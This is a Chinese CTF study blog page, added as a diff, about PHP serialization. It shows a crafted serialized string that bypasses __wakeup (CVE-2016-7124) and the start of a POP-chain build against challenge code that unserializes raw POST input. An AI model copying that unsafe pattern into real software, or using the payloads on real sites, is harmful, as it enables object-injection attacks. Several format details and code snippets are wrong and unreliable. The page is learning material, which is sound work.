@@ -1,0 +1,512 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>分类: 技术 | 暮色随风</title><meta name="author" content="zha0fe1"><meta name="copyright" content="zha0fe1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PHP特性">
+<meta property="og:type" content="article">
+<meta property="og:title" content="序列化与反序列化">
+<meta property="og:url" content="https://musewithwind.gitee.io/2022/12/02/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="暮色随风">
+<meta property="og:description" content="PHP特性">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp">
+<meta property="article:published_time" content="2022-12-02T09:46:00.000Z">
+<meta property="article:modified_time" content="2023-04-25T09:25:00.000Z">
+<meta property="article:author" content="zha0fe1">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://musewithwind.gitee.io/2022/12/02/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: zha0fe1","link":"链接: ","source":"来源: 暮色随风","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '分类: 技术',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-25 17:25:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/touxiang.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://musewithwind-1313815601.cos.ap-chengdu.myqcloud.com/hacker.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">暮色随风</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">序列化与反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-02T09:46:00.000Z" title="发表于 2022-12-02 17:46:00">2022-12-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-25T09:25:00.000Z" title="更新于 2023-04-25 17:25:00">2023-04-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="序列化与反序列化"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ul>
+<li>__construct()<ul>
+<li>在对象被创建时调用，当对象执行<code>seralize()</code>时</li>
+</ul>
+</li>
+<li>__destruct()<ul>
+<li>在对象的所有引用都被删除或者对象被显式销毁时执行</li>
+</ul>
+</li>
+<li>__call()<ul>
+<li>在对象中调用一个不可访问方法时调用</li>
+</ul>
+</li>
+<li>__callStatic()<ul>
+<li>用静态方式调用一个不可访问方法时调用</li>
+</ul>
+</li>
+<li>__set()<ul>
+<li>设置一个类的成员变量时调用</li>
+</ul>
+</li>
+<li>__get()<ul>
+<li>获得一个类的成员变量时调用</li>
+</ul>
+</li>
+<li>__isset()<ul>
+<li>当对不可访问(protected&#x2F;private)或不存在的属性调用isset()或empty()时，__isset()方法被调用</li>
+</ul>
+</li>
+<li>__unset()<ul>
+<li>当对不可访问(protected&#x2F;private)或不存在的属性调用unset()时，__unset()方法被调用</li>
+</ul>
+</li>
+<li>__sleep()<ul>
+<li>serialize函数会检查类中是否存在一个__sleep()函数，若存在，该方法会在序列化之前先被调用，然后才执行序列化操作，此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组</li>
+</ul>
+</li>
+<li>__wakeup()<ul>
+<li>unserialize函数会检查类中是否存在一个__wakeup()函数，若存在，该方法会在反序列化之前先被调用，预先准备对象需要的资源，__wakeup()通常用于反序列化操作中，然后才执行序列化操作，此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组</li>
+</ul>
+</li>
+<li>__serialize()和__unserialize()：<ul>
+<li>也是为序列化&#x2F;反序列化之前调用的函数，他们的优先级比sleep&#x2F;wakeup函数要高，当__serialize()和__unserialize()执行时，wakeup和sleep不执行。</li>
+</ul>
+</li>
+<li>__toString():<ul>
+<li>当一个类被当作字符串时调用此方法，此方法必须返回一个字符串</li>
+</ul>
+</li>
+<li>__invoke()<ul>
+<li>当尝试以调用函数的形式调用对象时自动调用</li>
+</ul>
+</li>
+<li>__clone()<ul>
+<li>当对象复制完成时调用 __autoload()，尝试加载未定义的类</li>
+</ul>
+</li>
+<li>__set_state()<ul>
+<li>调用var_export()导出类时，此静态方法会被调用</li>
+</ul>
+</li>
+<li></li>
+</ul>
+<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><blockquote>
+<p>使用serialize函数</p>
+</blockquote>
+<p>对于以下类，当变量访问权限为<code>public</code>时：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">democlass</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$str</span> = <span class="string">&quot;text&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$num</span> = <span class="number">123</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span>()&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">okk</span>()&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当我们创建对象<code>$duixiang = new democlass()</code>并执行<code>serialize($duixiang)</code>时，我们就对该对象进行了序列化：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">9</span>:<span class="string">&quot;democlass&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;str&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;i:<span class="number">3</span>:<span class="number">123</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以发现，对类的序列化不包括函数</span><br></pre></td></tr></table></figure>
+
+<p>接下来对以上序列化结果从左至右进行分析：</p>
+<ul>
+<li>O：表示类</li>
+<li>9：表示类名长度</li>
+<li>“democlass”：表示类名</li>
+<li>2：表示类中有两个序列化属性</li>
+<li>使用花括号表示内部序列化属性的结构，我们看内部序列化属性</li>
+<li>s：属性类型：字符串</li>
+<li>3：变量名的长度</li>
+<li>“str”：变量名</li>
+<li>分号间隔</li>
+<li>s：变量值的类型</li>
+<li>4：变量值的长度</li>
+<li>“text”：变量值</li>
+<li>至此<code>public $str</code>变量的序列化结束，对第二个变量<code>public $num</code>的分析同上</li>
+<li>第二个变量的序列化内容中i即代表整型</li>
+<li>其他数据类型的序列化特征可以自己写php代码了解</li>
+</ul>
+<p>当变量类型为<code>protected</code>或<code>private</code>时，又有什么变化？</p>
+<p>我们以以上代码为例，更改变量的访问权限：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">democlass</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$str</span> = <span class="string">&quot;text&quot;</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$num</span> = <span class="number">123</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span>()&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">okk</span>()&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当我们对以上对象进行序列化，就有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">9</span>:<span class="string">&quot;democlass&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;*str&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;text&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;num&quot;</span>;i:<span class="number">3</span>:<span class="number">123</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以注意到，变量str和num的变量名长度都变化了，为什么？</p>
+<p>str是由protected修饰的，对于由protected修饰的变量，序列化后的变量名就成为<code>%00*变量名%00</code>，放在这里就是<code>%00*str%00</code>，而%00是作为一个空白字符存在的，它默认不显示，因此，str的变量名长度就是<code>6</code></p>
+<p>num是由private修饰的，对于由private修饰的变量，序列化后的变量名就成为<code>%00变量名%00</code>(没有*号)，放在这里就是<code>%00num%00</code>，因此，str的变量名长度就是<code>5</code></p>
+<p>需要说明的是，在做CTF题目时，有些题目对对象序列化出来的结果由于访问权限修饰符的不同而异常，这里我们可以尝试在本地修改访问权限为public后重新序列化，php7.1+对访问权限不敏感。</p>
+<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>将序列化得到的结果又通过unserialize函数反序列化为对象</p>
+<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul>
+<li>PHP反序列化时，底层代码以”;”作为字段的分隔，以”}”作为序列化串的结束（字符串中的”}”除外），并且在反序列化时，根据长度判断内容，同时，严格遵守反序列化规则才能实现反序列化，否则不成功</li>
+<li>反序化中，}之外的字符串会被忽略</li>
+<li>反序列化时，若序列化串中有不存在的变量，则它将被创建</li>
+<li>序列化串中若长度不对应则会报错</li>
+</ul>
+<h2 id="解题姿势"><a href="#解题姿势" class="headerlink" title="解题姿势"></a>解题姿势</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><h4 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a>绕过__wakeup()</h4><blockquote>
+<p>来源：CVE-2016-7124</p>
+</blockquote>
+<p>通过上文我们可以了解到，当进行反序列化时，wakeup函数将被首先调用，在一些web题目中会在wakeup进行设障，比如在wakeup就执行<code>exit</code>或<code>die</code>等函数，这时我们可以构造序列化后的属性数量+1，这样就能够实现wakeup绕过，我们还是上代码，添加了wakeup函数和destruct函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">democlass</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$str</span> = <span class="string">&quot;text&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$num</span> = <span class="number">123</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span>()&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">okk</span>()&#123;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__wakeup</span>()&#123;</span><br><span class="line">	<span class="keyword">exit</span>()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__destruct</span>()&#123;</span><br><span class="line">		this-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_POST</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过以上代码，我们可以看到，当我们构造好序列化后的字符串，进行反序列化时，在wakeup函数中我们已经直接退出了本程序，往后代码也不会执行了，那么我们该怎么获取destruct函数中的flag?我们可以按照上文的思路进行：</p>
+<p>原先构造好的序列化字符串：</p>
+<p><code>O:9:&quot;democlass&quot;:2:&#123;s:3:&quot;str&quot;;s:4:&quot;text&quot;;s:3:&quot;num&quot;;i:3:123&#125;</code></p>
+<p>根据上文构造的绕过字符串：</p>
+<p><code>O:9:&quot;democlass&quot;:3:&#123;s:3:&quot;str&quot;;s:4:&quot;text&quot;;s:3:&quot;num&quot;;i:3:123&#125;</code></p>
+<p>可以发现，<code>&quot;democlass&quot;后的数字</code>多了一个，也就是属性的数量多了一个，然而代码中并没有多出来变量，此时，我们已经可以绕过wakeup获得flag</p>
+<h3 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h3><p>是关于反序列化的考题类型之一，我们还是直接上代码，复现链子的构造过程：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="comment">//highlight_file(__FILE__);  </span></span><br><span class="line"><span class="comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274  </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$func</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;        <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$var</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;        (<span class="variable language_">$this</span>-&gt;func)();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sec</span></span>&#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;        <span class="keyword">echo</span> <span class="string">&#x27;you success get the flag:flag&#123;xxx&#125;&#x27;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easy</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cla</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun</span>, <span class="variable">$var</span></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;        <span class="variable language_">$this</span>-&gt;cla = <span class="keyword">clone</span> <span class="variable">$var</span>[<span class="number">0</span>];  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eeee</span></span>&#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于以上函数，我们从最后看起：很明显需要用post方式提交一个序列化了的pop值，以生成对象。</p>
+<p>此处提示很明显需要构造pop链，怎么构造？</p>
+<h4 id="找到目标函数"><a href="#找到目标函数" class="headerlink" title="找到目标函数"></a>找到目标函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;        </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;you success get the flag:flag&#123;xxx&#125;&#x27;</span>;  </span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure>
+
+<h4 id="找到入口函数"><a href="#找到入口函数" class="headerlink" title="找到入口函数"></a>找到入口函数</h4><p>以上代码中，只有start类的destruct函数会在类销毁时自动调用，很明显它就是入口函数<br>我们创建一个变量<code>res</code>实例化Start类以触发destruct方法： <code>$res=new Start()</code></p>
+<h4 id="以入口函数为引子，构造整条链子"><a href="#以入口函数为引子，构造整条链子" class="headerlink" title="以入口函数为引子，构造整条链子"></a>以入口函数为引子，构造整条链子</h4><p>观察入口函数<code>destruct</code>，我们不难发现，它将前面的字符串与后面的成员变量做了拼接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">   </span>&#123;        </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="variable language_">$this</span>-&gt;name;  </span><br><span class="line">   &#125;  </span><br></pre></td></tr></table></figure>
+
+<p>因此，可以联想到。如果这里的成员变量name也是一个对象，它将调用tostring方法，我们在<code>Sec类</code>中发现tostring方法：所以，可使得<code>$res-&gt;name = new Sec() </code>调用tostring方法 </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;CTFers&quot;</span>;  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>
+
+<p>观察tostring方法，发现调用了<code>check函数</code>，check函数属于Object对象，tostring所在的<code>sec类</code>并不存在该函数，反而在<code>类easy</code>中我们找到了<code>call函数</code>，在文章开头可以知道，call函数在调用一个不存在的方法时将调用，因此我们的思路得以继续，可以构造：<code>$res-&gt;name-&gt;obj = new Easy()</code></p>
